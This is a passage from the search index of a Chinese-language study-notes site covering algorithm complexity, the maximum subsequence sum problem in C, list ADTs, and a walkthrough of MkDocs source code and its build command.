\\(T(n) = aT(n/b)+f(n)\\) \uff08 \\(a\\geq 1, b>1\\) \uff09\uff0c\u5219\uff1a \u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon > 0\\) \u6709 \\(f(n) = O(n^{\\log_ba-\\epsilon})\\) \uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_ba})\\) \u5982\u679c \\(f(n) = \\Theta(n^{\\log_ba})\\) \u5219 \\(T(n) = \\Theta(n^{\\log_ba}\\log n)\\) \u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon > 0\\) \u6709 \\(f(n) = \\Omega(n^{\\log_ba+\\epsilon})\\) \uff0c\u540c\u65f6\u5b58\u5728\u5e38\u6570 \\(c<1\\) \u4f7f\u5f97\u5bf9\u4e8e\u5145\u5206\u5927 \\(n\\) \u6709 \\(af(n/b)\\leq cf(n)\\) \u5219 \\(T(N) = \\Theta(f(n))\\) \u4f8b\uff1a\u6700\u5927\u5b50\u5e8f\u5217\u548c\u95ee\u9898 \u00b6 O(N\u00b3) \u00b6 \u76f4\u63a5\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u5e76\u8ba1\u7b97\u4e2d\u95f4\u5b50\u5e8f\u5217\u548c\uff1a int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 ; for ( int i = 0 ; i < N ; ++ i ) { for ( int j = i ; j < N ; ++ j ) { int now = 0 ; for ( k = i ; k <= j ; ++ k ) { now += a [ k ]; } res = max ( res , now ); } } return res ; } O(N\u00b2) \u00b6 \u540c\u6837\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u4e0d\u8fc7\u52a8\u6001\u8ba1\u7b97\u5b50\u5e8f\u5217\u548c\uff0c\u7701\u53bb\u6700\u5185\u5c42\u5faa\u73af int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 ; for ( int i = 0 ; i < N ; ++ i ) { int now = 0 ; for ( int j = i ; j < N ; ++ j ) { now += a [ j ]; res = max ( res , now ); } } return res ; } O(NlogN) \u00b6 \u4f7f\u7528\u5206\u6cbb\u7b97\u6cd5 \\[ \\begin{align*} T(N) &= 2T(N/2)+cN,\\quad T(1) = O(1) \\\\ &= 2\\left(2T(N/2^2)+cN/2\\right)+cN \\\\ &= 2^kO(1) + ckN\\qquad\\text{where }N/2^k=1 \\\\ &= O(N\\log N) \\end{align*} \\] O(N) \u00b6 \u52a8\u6001\u89c4\u5212\u601d\u60f3 int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 , now = 0 ; for ( int i = 0 ; i < N ; ++ i ) { now += a [ i ]; res = max ( res , now ); now = max ( now , 0 ); } return res ; }","title":"\u7b97\u6cd5\u5206\u6790\u57fa\u7840"},{"location":"cs/algorithm/ds/topic1/#_1","text":"Abstract \u6570\u636e\u7ed3\u6784\u57fa\u7840\u7b2c 1 \u81f3 2 \u5468\u8bfe\u7a0b\u5185\u5bb9","title":"\u7b97\u6cd5\u5206\u6790\u57fa\u7840"},{"location":"cs/algorithm/ds/topic1/#_2","text":"\u4e00\u4e2a\u5b9a\u4e49\u597d\u7684\u3001\u8ba1\u7b97\u673a\u53ef\u6267\u884c\u7684\u3001\u89e3\u51b3\u67d0\u4e00\u95ee\u9898\u7684\u6709\u9650\u6b65\u9aa4 \u9700\u8981\u6709\u4ee5\u4e0b\u7279\u5f81\uff1a Input Output Definiteness Finiteness Effectiveness program \u4e0d\u9700\u8981 finite\uff08\u6bd4\u5982\u64cd\u4f5c\u7cfb\u7edf\uff09 \u7b97\u6cd5\u5206\u6790\u5185\u5bb9\uff1a \u8fd0\u884c\u65f6\u95f4\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u6709\u5173 \u65f6\u95f4\u590d\u6742\u5ea6\u3001\u7a7a\u95f4\u590d\u6742\u5ea6\uff1a\u4e0e\u673a\u5668\u548c\u7f16\u8bd1\u5668\u65e0\u5173 \u590d\u6742\u5ea6\u5206\u6790\u5047\u8bbe \u6307\u4ee4\u6309\u987a\u5e8f\u6267\u884c \u6240\u6709\u6307\u4ee4\uff08\u8fd0\u7b97\uff09\u90fd\u6d88\u8017\u540c\u4e00\u65f6\u95f4\u5355\u5143 \u6570\u636e\u89c4\u6a21\u662f\u7ed9\u5b9a\u7684\uff0c\u4e14\u6709\u65e0\u9650\u7a7a\u95f4 \u4e00\u822c\u9700\u8981\u5206\u6790 \\(T_{\\mathrm{avg}}(N)\\) \uff08\u5e73\u5747\u60c5\u51b5\uff09\u548c \\(T_{\\mathrm{worst}}(N)\\) \uff08\u6700\u5dee\u60c5\u51b5\uff09\uff0c \\(N\\) \u662f\u8f93\u5165\u7684\u6570\u636e\u89c4\u6a21\uff08\u4e5f\u53ef\u4ee5\u6709\u591a\u4e2a\u8f93\u5165\u89c4\u6a21\uff09","title":"\u7b97\u6cd5\u4e0e\u5206\u6790"},{"location":"cs/algorithm/ds/topic1/#_3","text":"","title":"\u590d\u6742\u5ea6\u6e10\u8fdb\u8bb0\u53f7"},{"location":"cs/algorithm/ds/topic1/#_4","text":"\u5927 \\(O\\) \u8868\u793a\u6cd5 \\(T(N) = O(f(N))\\) \uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\leq c\\cdot f(N)\\) \u6e10\u8fdb\u4e0a\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u9ad8\u4e8e \\(f(N)\\) \uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u6162\u6216\u76f8\u540c\uff0c<=\uff09 \u5927 \\(\\Omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\Omega(g(N))\\) \uff0c\u5982\u679c\u5b58\u5728\u5e38\u6570 \\(c\\) \u548c \\(n_0\\) \u4f7f\u5f97\u5f53 \\(N\\geq n_0\\) \u65f6 \\(T(N)\\geq c\\cdot g(N)\\) \u6e10\u8fdb\u4e0b\u754c\uff0c\u5373 \\(T(N)\\) \u7684\u9636\u4e0d\u4f1a\u4f4e\u4e8e \\(f(N)\\) \uff08\u589e\u957f\u6bd4 \\(f(N)\\) \u5feb\u6216\u76f8\u540c\uff0c>=\uff09 \u5927 \\(\\Theta\\) \u8868\u793a\u6cd5 \\(T(N) = \\Theta(h(N))\\) \uff0c\u5f53\u4e14\u4ec5\u5f53 \\(T(N) = O(h(N))\\) \u4e14 \\(T(N) = \\Omega(h(N))\\) \u6e10\u8fdb\u7d27\u786e\u754c\uff0c\u5373 \\(T(N)\\) \u9700\u8981\u4e0e \\(h(N)\\) \u540c\u9636\uff08\u589e\u957f\u901f\u5ea6\u76f8\u540c =\uff09 \u5c0f \\(o\\) \u8868\u793a\u6cd5 \\(T(N) = o(p(N))\\) \uff0c\u5f53 \\(T(N) = O(p(N))\\) \u4e14 \\(T(N)\\ne \\Theta(p(N))\\) \u65f6 \u975e\u6e10\u8fdb\u7d27\u786e\u4e0a\u754c\uff08 \\(T(N)\\) \u589e\u957f\u6bd4 \\(p(N)\\) \u6162\uff0c<\uff09 \u5c0f \\(\\omega\\) \u8868\u793a\u6cd5 \\(T(N) = \\omega(p(N))\\) \uff0c\u5f53 \\(T(N) = \\Omega(q(N))\\) \u4e14 \\(T(N)\\ne \\Theta(q(N))\\) \u65f6 \u975e\u6e10\u8fdb\u7d27\u786e\u4e0b\u754c\uff08 \\(T(N)\\) \u589e\u957f\u6bd4 \\(q(N)\\) \u5feb\uff0c>\uff09","title":"\u5b9a\u4e49"},{"location":"cs/algorithm/ds/topic1/#_5","text":"\u5982\u679c \\(T_1(N) = O(f(N))\\) \u4e14 \\(T_2(N) = O(g(N))\\) \uff0c\u5219\uff1a \\(T_1(N) + T_2(N) = \\mathrm{max}(O(f(N)), O(g(N)))\\) \\(T_1(N)\\cdot T_2(N) = O(f(N)\\cdot g(N))\\) \u5982\u679c \\(T(N)\\) \u662f \\(N\\) \u7684 \\(k\\) \u6b21\u591a\u9879\u5f0f\uff0c\u5219 \\(T(N) = \\Theta(N^k)\\) \u5bf9\u4e8e\u4efb\u610f\u5e38\u6570 \\(k\\) \u5747\u6709 \\(\\log^kN = O(N)\\) \u5927 O \u8bb0\u53f7\u6bd4\u8f83\uff1a Big O Cheat Sheet \u5206\u6790\u89c4\u5219\uff1a for \u5faa\u73af\u7684\u8fd0\u884c\u65f6\u95f4\u662f\u5faa\u73af\u5185\u90e8\u8bed\u53e5\u7684\u6700\u957f\u65f6\u95f4\uff08\u542b for \u5224\u65ad\uff09\u4e58\u5faa\u73af\u6b21\u6570 \u5d4c\u5957 for \u5faa\u73af\u8981\u9010\u6b21\u76f8\u4e58 if else \u8bed\u53e5\u7684\u8fd0\u884c\u65f6\u95f4\u4e0d\u8d85\u8fc7\u5224\u65ad\u65f6\u95f4+\u8017\u65f6\u6700\u957f\u7684\u8bed\u53e5\u5757\u7684\u8fd0\u884c\u65f6\u95f4 \u8865\u5145\uff1a\u4e3b\u5b9a\u7406\u3002\u5047\u8bbe\u6709 \\(T(n) = aT(n/b)+f(n)\\) \uff08 \\(a\\geq 1, b>1\\) \uff09\uff0c\u5219\uff1a \u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon > 0\\) \u6709 \\(f(n) = O(n^{\\log_ba-\\epsilon})\\) \uff0c\u5219 \\(T(n) = \\Theta(n^{\\log_ba})\\) \u5982\u679c \\(f(n) = \\Theta(n^{\\log_ba})\\) \u5219 \\(T(n) = \\Theta(n^{\\log_ba}\\log n)\\) \u5982\u679c\u5b58\u5728\u5e38\u6570 \\(\\epsilon > 0\\) \u6709 \\(f(n) = \\Omega(n^{\\log_ba+\\epsilon})\\) \uff0c\u540c\u65f6\u5b58\u5728\u5e38\u6570 \\(c<1\\) \u4f7f\u5f97\u5bf9\u4e8e\u5145\u5206\u5927 \\(n\\) \u6709 \\(af(n/b)\\leq cf(n)\\) \u5219 \\(T(N) = \\Theta(f(n))\\)","title":"\u89c4\u5219"},{"location":"cs/algorithm/ds/topic1/#_6","text":"","title":"\u4f8b\uff1a\u6700\u5927\u5b50\u5e8f\u5217\u548c\u95ee\u9898"},{"location":"cs/algorithm/ds/topic1/#on3","text":"\u76f4\u63a5\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u5e76\u8ba1\u7b97\u4e2d\u95f4\u5b50\u5e8f\u5217\u548c\uff1a int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 ; for ( int i = 0 ; i < N ; ++ i ) { for ( int j = i ; j < N ; ++ j ) { int now = 0 ; for ( k = i ; k <= j ; ++ k ) { now += a [ k ]; } res = max ( res , now ); } } return res ; }","title":"O(N\u00b3)"},{"location":"cs/algorithm/ds/topic1/#on2","text":"\u540c\u6837\u679a\u4e3e\u5f00\u5934\u7ed3\u5c3e\uff0c\u4e0d\u8fc7\u52a8\u6001\u8ba1\u7b97\u5b50\u5e8f\u5217\u548c\uff0c\u7701\u53bb\u6700\u5185\u5c42\u5faa\u73af int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 ; for ( int i = 0 ; i < N ; ++ i ) { int now = 0 ; for ( int j = i ; j < N ; ++ j ) { now += a [ j ]; res = max ( res , now ); } } return res ; }","title":"O(N\u00b2)"},{"location":"cs/algorithm/ds/topic1/#onlogn","text":"\u4f7f\u7528\u5206\u6cbb\u7b97\u6cd5 \\[ \\begin{align*} T(N) &= 2T(N/2)+cN,\\quad T(1) = O(1) \\\\ &= 2\\left(2T(N/2^2)+cN/2\\right)+cN \\\\ &= 2^kO(1) + ckN\\qquad\\text{where }N/2^k=1 \\\\ &= O(N\\log N) \\end{align*} \\]","title":"O(NlogN)"},{"location":"cs/algorithm/ds/topic1/#on","text":"\u52a8\u6001\u89c4\u5212\u601d\u60f3 int MaxSubsequenceSum ( const int a [], int N ) { int res = 0 , now = 0 ; for ( int i = 0 ; i < N ; ++ i ) { now += a [ i ]; res = max ( res , now ); now = max ( now , 0 ); } return res ; }","title":"O(N)"},{"location":"cs/algorithm/ds/topic2/","text":"\u5217\u8868\u3001\u6808\u3001\u961f\u5217 \u00b6 Abstract \u6570\u636e\u7ed3\u6784\u57fa\u7840\u7b2c 2 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u6570\u636e\u7c7b\u578b\uff08Data Type\uff09= { \u5bf9\u8c61 } \u222a { \u64cd\u4f5c } \u62bd\u8c61\u6570\u636e\u7c7b\u578b\uff08Abstract Data Type\uff09\uff0c\u6307\u5b9a\u7684\u5bf9\u8c61\u548c\u64cd\u4f5c\u548c\u5b9e\u9645\u7684\u8868\u793a\u4ee5\u53ca\u5b9e\u73b0\u662f\u5206\u79bb\u7684 \u5217\u8868 ADT \u00b6 \u5bf9\u8c61\uff1a(\u5143\u7d20 0, \u5143\u7d20 1, ..., \u5143\u7d20 n-1) \u64cd\u4f5c\uff1a \u5bfb\u627e\u957f\u5ea6\uff1an \u6253\u5370\u5217\u8868 \u6784\u9020\u7a7a\u5217\u8868 \u627e\u5230\u7b2c k \u4e2a\u5143\u7d20 \u5728\u7b2c k \u4e2a\u5143\u7d20\u540e\u63d2\u5165\u65b0\u5143\u7d20 \u5220\u9664\u67d0\u4e00\u4e2a\u5143\u7d20 \u627e\u5230\u5f53\u524d\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a/\u4e0a\u4e00\u4e2a\u5143\u7d20 \u6709\u591a\u79cd\u5b9e\u73b0\uff1a\u7b80\u5355\u6570\u7ec4\u3001\u5404\u79cd\u94fe\u8868\u2026\u2026 \u7b80\u5355\u6570\u7ec4 \u4f18\u70b9\uff1a \u627e\u7b2c k \u4e2a\u5143\u7d20\u7684\u590d\u6742\u5ea6\u4e3a \\(O(1)\\) \u7f3a\u70b9\uff1a \u9700\u8981\u9884\u5148\u4f30\u8ba1\u6700\u5927\u957f\u5ea6\uff08\u5206\u914d\u7a7a\u95f4\uff09 \u63d2\u5165\u548c\u5220\u9664\u590d\u6742\u5ea6\u4e3a \\(O(N)\\) \uff0c\u4e14\u4f1a\u9020\u6210\u5927\u91cf\u5185\u5b58\u79fb\u52a8 \u94fe\u8868 \u63d2\u5165\u548c\u5220\u9664\u590d\u6742\u5ea6\u90fd\u4e3a \\(O(1)\\) \u52a8\u6001\u5206\u914d\u7a7a\u95f4 \u5bfb\u627e\u7b2c k \u4e2a\u5143\u7d20\u590d\u6742\u5ea6 \\(O(N)\\) \u4f1a\u6d89\u53ca\u5220\u9664\u7b2c\u4e00\u4e2a\u8282\u70b9\u7684\u8bdd\u6dfb\u52a0\u865a\u62df\u8868\u5934\uff08dummy head\uff09\u66f4\u65b9\u4fbf","title":"\u5217\u8868\u3001\u6808\u3001\u961f\u5217"},{"location":"cs/algorithm/ds/topic2/#_1","text":"Abstract \u6570\u636e\u7ed3\u6784\u57fa\u7840\u7b2c 2 \u5468\u8bfe\u7a0b\u5185\u5bb9 \u6570\u636e\u7c7b\u578b\uff08Data Type\uff09= { \u5bf9\u8c61 } \u222a { \u64cd\u4f5c } \u62bd\u8c61\u6570\u636e\u7c7b\u578b\uff08Abstract Data Type\uff09\uff0c\u6307\u5b9a\u7684\u5bf9\u8c61\u548c\u64cd\u4f5c\u548c\u5b9e\u9645\u7684\u8868\u793a\u4ee5\u53ca\u5b9e\u73b0\u662f\u5206\u79bb\u7684","title":"\u5217\u8868\u3001\u6808\u3001\u961f\u5217"},{"location":"cs/algorithm/ds/topic2/#adt","text":"\u5bf9\u8c61\uff1a(\u5143\u7d20 0, \u5143\u7d20 1, ..., \u5143\u7d20 n-1) \u64cd\u4f5c\uff1a \u5bfb\u627e\u957f\u5ea6\uff1an \u6253\u5370\u5217\u8868 \u6784\u9020\u7a7a\u5217\u8868 \u627e\u5230\u7b2c k \u4e2a\u5143\u7d20 \u5728\u7b2c k \u4e2a\u5143\u7d20\u540e\u63d2\u5165\u65b0\u5143\u7d20 \u5220\u9664\u67d0\u4e00\u4e2a\u5143\u7d20 \u627e\u5230\u5f53\u524d\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a/\u4e0a\u4e00\u4e2a\u5143\u7d20 \u6709\u591a\u79cd\u5b9e\u73b0\uff1a\u7b80\u5355\u6570\u7ec4\u3001\u5404\u79cd\u94fe\u8868\u2026\u2026 \u7b80\u5355\u6570\u7ec4 \u4f18\u70b9\uff1a \u627e\u7b2c k \u4e2a\u5143\u7d20\u7684\u590d\u6742\u5ea6\u4e3a \\(O(1)\\) \u7f3a\u70b9\uff1a \u9700\u8981\u9884\u5148\u4f30\u8ba1\u6700\u5927\u957f\u5ea6\uff08\u5206\u914d\u7a7a\u95f4\uff09 \u63d2\u5165\u548c\u5220\u9664\u590d\u6742\u5ea6\u4e3a \\(O(N)\\) \uff0c\u4e14\u4f1a\u9020\u6210\u5927\u91cf\u5185\u5b58\u79fb\u52a8 \u94fe\u8868 \u63d2\u5165\u548c\u5220\u9664\u590d\u6742\u5ea6\u90fd\u4e3a \\(O(1)\\) \u52a8\u6001\u5206\u914d\u7a7a\u95f4 \u5bfb\u627e\u7b2c k \u4e2a\u5143\u7d20\u590d\u6742\u5ea6 \\(O(N)\\) \u4f1a\u6d89\u53ca\u5220\u9664\u7b2c\u4e00\u4e2a\u8282\u70b9\u7684\u8bdd\u6dfb\u52a0\u865a\u62df\u8868\u5934\uff08dummy head\uff09\u66f4\u65b9\u4fbf","title":"\u5217\u8868 ADT"},{"location":"cs/analysis/","text":"\u6e90\u7801\u5256\u6790 \u00b6 Abstract \u4e00\u4e9b\u8bfb\u8fc7\u7684\u9879\u76ee\u6e90\u7801\u5256\u6790\u7b14\u8bb0 \u6c34\u5e73\u6709\u9650\uff0c\u4ec5\u4f9b\u53c2\u8003 Table of Contents \u00b6 mkdocs \u6e90\u7801\u5256\u6790","title":"\u6e90\u7801\u5256\u6790"},{"location":"cs/analysis/#_1","text":"Abstract \u4e00\u4e9b\u8bfb\u8fc7\u7684\u9879\u76ee\u6e90\u7801\u5256\u6790\u7b14\u8bb0 \u6c34\u5e73\u6709\u9650\uff0c\u4ec5\u4f9b\u53c2\u8003","title":"\u6e90\u7801\u5256\u6790"},{"location":"cs/analysis/#table-of-contents","text":"mkdocs \u6e90\u7801\u5256\u6790","title":"Table of Contents"},{"location":"cs/analysis/mkdocs/","text":"mkdocs \u6e90\u7801\u5256\u6790 \u00b6 Abstract \u6e90\u9879\u76ee\u5730\u5740\uff1a mkdocs/mkdocs \u5256\u6790\u65f6 sha \u503c\uff1a 730da08158 \u5305\u914d\u7f6e\u3001\u5165\u53e3\u70b9 \u00b6 \u5305\u914d\u7f6e \u00b6 \u4e00\u4e9b\u57fa\u7840\u914d\u7f6e\u4e0d\u5fc5\u8bf4\uff0c\u4e3b\u8981\u662f entry_points \u914d\u7f6e\uff1a setup ( ... entry_points = { 'console_scripts' : [ 'mkdocs = mkdocs.__main__:cli' , ], 'mkdocs.themes' : [ 'mkdocs = mkdocs.themes.mkdocs' , 'readthedocs = mkdocs.themes.readthedocs' , ], 'mkdocs.plugins' : [ 'search = mkdocs.contrib.search:SearchPlugin' , ], }, ... ) \u53ef\u89c1\u521b\u5efa\u4e86\u4e09\u4e2a entry_points\uff1a CLI \u547d\u4ee4 mkdocs\uff0c\u5165\u53e3\u70b9 mkdocs.__main__:cli mkdocs.themes\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u4e3b\u9898 mkdocs.plugins\uff0c\u7528\u4e8e\u63a5\u5165\u5916\u90e8\u5305\u5b9a\u4e49\u7684\u63d2\u4ef6 \u5165\u53e3\u70b9 \u00b6 \u547d\u4ee4\u884c\u7684\u5165\u53e3\u70b9\u4e3a mkdocs.__main__:cli\u3002\u4e0b\u5206\u6790 __main__.py\uff1a log \u76f8\u5173\uff1a \u4e00\u4e2a\u81ea\u5b9a\u4e49\u7684 ColorFormatter\uff08 \u6211\u4e0d\u662f\u5f88\u559c\u6b22\u8fd9\u4e2a\u6837\u5f0f\uff0c\u53ef\u4ee5\u6539\u6389 \uff09 \u4e00\u4e2a State \u7528\u4e8e\u7ef4\u62a4\u4e0d\u540c\u547d\u4ee4\u7684 log level\uff08\u540e\u6709 click . make_pass_decorator ( State , ensure = True ) \uff09 cli \u76f8\u5173\uff1a \u5229\u7528 click \u5e93 @click . group ( context_settings = { 'help_option_names' : [ '-h' , '--help' ]}) # \u8bbe\u7f6e help \u547d\u4ee4 @click . version_option ( # \u8bbe\u7f6e version \u547d\u4ee4\u548c\u663e\u793a\u4fe1\u606f __version__ , '-V' , '--version' , message = f '%(prog)s, version %(version)s from { PKG_DIR } (Python { PYTHON_VERSION } )' , ) @common_options # \u901a\u7528\u8bbe\u7f6e def cli (): # \u547d\u4ee4\u884c\u4e3b\u547d\u4ee4 mkdocs \"\"\" MkDocs - Project documentation with Markdown. \"\"\" \u4e00\u4e9b\u5b50\u547d\u4ee4\uff0c\u9009\u9879\u6dfb\u52a0\u4e0e\u4e0a\u9762\u7c7b\u4f3c\uff0c\u4e0d\u8d58\u8ff0 serve \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.serve.serve \u51fd\u6570 build \u5b50\u547d\u4ee4\uff1a\u5904\u7406 config\uff08\u5728 mkdocs.config \u6a21\u5757\u4e2d\u8be6\u7ec6\u5b9a\u4e49\uff09\u3001\u542f\u52a8\u63d2\u4ef6\u3001\u8c03\u7528 mkdocs.commands.build.build \u51fd\u6570\uff0c\u672a\u5931\u8d25\u5219\u8fd0\u884c\u540e\u5173\u95ed\u63d2\u4ef6 gh-deploy \u5b50\u547d\u4ee4\uff1a\u5728 build \u540e\u8c03\u7528 mkdocs.commands.gh_deploy.gh_deploy new \u5b50\u547d\u4ee4\uff1a\u8c03\u7528 mkdocs.commands.new.new \u51fd\u6570 \u5305\u7ed3\u6784\u5206\u6790 \u00b6 \u9664\u53bb tests \u548c\u5176\u5b83\u5197\u4f59\u4ee3\u7801\u540e\uff0c\u5927\u81f4\u5206\u6790\u7684\u6574\u4e2a\u5305\u7ed3\u6784\uff1a mkdocs \u251c\u2500\u2500 __init__.py # \u5b9a\u4e49\u4e86\u7248\u672c\u53f7 \u251c\u2500\u2500 __main__.py # CLI \u5165\u53e3\u70b9 \u251c\u2500\u2500 commands # CLI \u5b9a\u4e49 \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 babel.py # \u5904\u7406\u8bed\u8a00\u6587\u4ef6\uff08\u4e0d\u662f CLI \u547d\u4ee4\uff09 \u2502 \u251c\u2500\u2500 build.py # \u6784\u5efa\u6587\u6863\uff08mkdocs build\uff09 \u2502 \u251c\u2500\u2500 gh_deploy.py # \u90e8\u7f72\u5230 Pages\uff08mkdocs gh-deploy\uff09 \u2502 \u251c\u2500\u2500 new.py # \u521b\u5efa\u65b0\u9879\u76ee\uff08mkdocs new\uff09 \u2502 \u251c\u2500\u2500 serve.py # \u5f00\u542f\u672c\u5730\u9884\u89c8\u670d\u52a1\uff08mkdocs serve\uff09 \u2502 \u2514\u2500\u2500 setup.py # \u76ee\u6d4b\u6ca1\u7528\uff1f \u251c\u2500\u2500 config \u2502 \u251c\u2500\u2500 __init__.py # \u53ea\u5bfc\u51fa base \u548c config_options \u2502 \u251c\u2500\u2500 base.py # \u57fa\u7840\u914d\u7f6e \u2502 \u251c\u2500\u2500 config_options.py # \u5404\u79cd\u53c2\u6570\u4ee5\u53ca\u9a8c\u8bc1\u65b9\u5f0f \u2502 \u2514\u2500\u2500 defaults.py # \u9ed8\u8ba4\u914d\u7f6e \u251c\u2500\u2500 contrib \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u2514\u2500\u2500 search \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 lunr-language \u2502 \u2502 \u2514\u2500\u2500 ... \u2502 \u251c\u2500\u2500 prebuild-index.js \u2502 \u251c\u2500\u2500 search_index.py \u2502 \u2514\u2500\u2500 templates \u2502 \u2514\u2500\u2500 search \u2502 \u251c\u2500\u2500 lunr.js \u2502 \u251c\u2500\u2500 main.js \u2502 \u2514\u2500\u2500 worker.js \u251c\u2500\u2500 exceptions.py # \u4e00\u4e9b\u5b9a\u4e49\u7684\u5f02\u5e38 \u251c\u2500\u2500 livereload \u2502 \u2514\u2500\u2500 __init__.py # \u672c\u5730\u9884\u89c8\u81ea\u52a8\u5237\u65b0\u670d\u52a1 \u251c\u2500\u2500 localization.py # \u672c\u5730\u5316\u76f8\u5173\u4ee3\u7801 \u251c\u2500\u2500 plugins.py # \u63d2\u4ef6\u7ba1\u7406 \u251c\u2500\u2500 structure # \u9875\u9762\u7ed3\u6784 \u2502 \u251c\u2500\u2500 __init__.py \u2502 \u251c\u2500\u2500 files.py \u2502 \u251c\u2500\u2500 nav.py \u2502 \u251c\u2500\u2500 pages.py \u2502 \u2514\u2500\u2500 toc.py \u251c\u2500\u2500 templates \u2502 \u2514\u2500\u2500 sitemap.xml \u251c\u2500\u2500 theme.py # \u4e3b\u9898\u7c7b \u251c\u2500\u2500 themes \u2502 \u2514\u2500\u2500 ... \u2514\u2500\u2500 utils \u251c\u2500\u2500 __init__.py \u251c\u2500\u2500 babel_stub.py \u251c\u2500\u2500 filters.py \u2514\u2500\u2500 meta.py \u4e00\u4e9b\u5de5\u5177\u6027\u4ee3\u7801 \u00b6 \u548c\u8fd0\u884c\u4e3b\u903b\u8f91\u65e0\u5927\u5173\u7cfb\u7684\u4e00\u4e9b\u4ee3\u7801\uff1a exceptions.py \u00b6 \u5b9a\u4e49\u4e86\u4e94\u4e2a\u5f02\u5e38\u7c7b\uff1a \u57fa\u7c7b MkDocsException\uff0c\u4e0d\u4f1a\u76f4\u63a5\u4f7f\u7528\u3002\u7ee7\u627f\u81ea ClickException\uff0c\u4f7f click \u80fd\u591f\u5904\u7406\u5e76\u663e\u793a Abort\uff0c\u7ec8\u6b62\u6267\u884c\uff0c\u53ef\u4ee5\u5e26\u6709\u4fe1\u606f ConfigurationError\uff0c\u7531\u4e8e\u914d\u7f6e\u6587\u4ef6\u539f\u56e0\u5bfc\u81f4\u7684\u9519\u8bef BuildError\uff0c\u6784\u5efa\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u7684\u9519\u8bef\uff0cmkdocs \u6e90\u7801\u4e2d\u5e76\u672a\u76f4\u63a5\u629b\u51fa\u6b64\u7c7b\u9519\u8bef\uff0c\u4f46\u6709\u5b50\u7c7b PluginError\uff0c\u5e94\u8be5\u662f\u7ed9\u7b2c\u4e09\u65b9\u63d2\u4ef6\u4f7f\u7528\u7684 PluginError\uff0c\u5728\u63d2\u4ef6\u4e2d\u53ef\u4ee5\u629b\u51fa\u7684\u5f02\u5e38\uff0c\u7ee7\u627f\u81ea BuildError utils \u00b6 build \u6d41\u7a0b \u00b6 \u4ece mkdocs build \u8fd9\u4e00\u547d\u4ee4\u7684\u6267\u884c\u6d41\u7a0b\u6765\u9010\u6b65\u81ea\u9876\u5411\u4e0b\u5206\u6790 \u9996\u5148\u4ece __main__.py \u8fdb\u5165\uff0c\u8c03\u7528\u5230 build_command \u51fd\u6570\uff1a __main__.py 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 @cli . command ( name = \"build\" ) @click . option ( '-c' , '--clean/--dirty' , is_flag = True , default = True , help = clean_help ) @common_config_options @click . option ( '-d' , '--site-dir' , type = click . Path (), help = site_dir_help ) @common_options def build_command ( clean , ** kwargs ): \"\"\"Build the MkDocs documentation\"\"\" from mkdocs.commands import build _enable_warnings () cfg = config . load_config ( ** kwargs ) cfg [ 'plugins' ] . run_event ( 'startup' , command = 'build' , dirty = not clean ) try : build . build ( cfg , dirty = not clean ) finally : cfg [ 'plugins' ] . run_event ( 'shutdown' ) \u5176\u4e2d common_options \u548c common_config_options \u88c5\u9970\u5668\u5b9a\u4e49\u4e3a\uff1a __main__.py 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 common_options = add_options ( quiet_option , verbose_option ) common_config_options = add_options ( click . option ( '-f' , '--config-file' , type = click . File ( 'rb' ), help = config_help ), # Don't override config value if user did not specify --strict flag # Conveniently, load_config drops None values click . option ( '-s' , '--strict' , is_flag = True , default = None , help = strict_help ), click . option ( '-t' , '--theme' , type = click . Choice ( theme_choices ), help = theme_help ), # As with --strict, set the default to None so that this doesn't incorrectly # override the config file click . option ( '--use-directory-urls/--no-directory-urls' , is_flag = True , default = None , help = use_directory_urls_help , ), ) \u4e5f\u5c31\u662f\u589e\u52a0\u4e86 -q -v -f -s -t --use-directory-urls/--no-directory-urls \u8fd9\u4e9b\u547d\u4ee4\u884c\u53c2\u6570\uff08\u4e5f\u4f1a\u4f20\u5230 kwargs \u4e2d\uff09 _enable_warnings() \u53ef\u4ee5\u4e0d\u7528\u7ba1\u3002\u4e4b\u540e\u7684\u6d41\u7a0b\u5c31\u662f\uff1a \u8c03\u7528 config.load_config \u52a0\u8f7d\u914d\u7f6e \u4ece\u914d\u7f6e\u4e2d\u627e\u5230\u63d2\u4ef6\uff0c\u5e76\u89e6\u53d1\u5176 startup \u4e8b\u4ef6 \u5c1d\u8bd5\u8c03\u7528 build.build \u51fd\u6570\u6784\u5efa\u6587\u6863 \u82e5\u4e0d\u6210\u529f\u5219\u76f4\u63a5\u6302\u6389\u7a0b\u5e8f \u82e5\u6210\u529f\u5219\u89e6\u53d1\u63d2\u4ef6\u7684 shutdown \u4e8b\u4ef6\uff0c\u8fd0\u884c\u7ed3\u675f \u52a0\u8f7d\u914d\u7f6e \u00b6 config/base.py \u4e2d 261 \u884c\u5f00\u59cb\u7684\u51fd\u6570 